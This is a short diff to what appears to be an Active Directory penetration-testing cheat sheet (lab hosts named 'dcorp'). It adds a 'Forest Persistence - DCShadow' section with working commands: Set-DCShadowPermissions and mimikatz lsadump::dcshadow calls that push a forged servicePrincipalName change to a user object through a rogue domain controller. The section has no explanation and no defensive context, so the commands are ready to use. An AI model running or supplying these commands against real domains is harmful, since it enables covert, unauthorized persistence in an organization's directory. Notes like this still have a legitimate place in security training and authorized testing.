@@ -931,6 +931,11 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp- mgmt",''se
 
 
 # Forest Persistence - DCShadow
+```Set-DCShadowPermissions```
+
+```# lsadump::dcshadow /object:rootXuser /attribute:servicePrincipalName /value:"DCReplication/DCX"```
+
+```lsadump::dcshadow /push```
 
 # Certificates
 https://blog.harmj0y.net/activedirectory/certified-pre-owned/
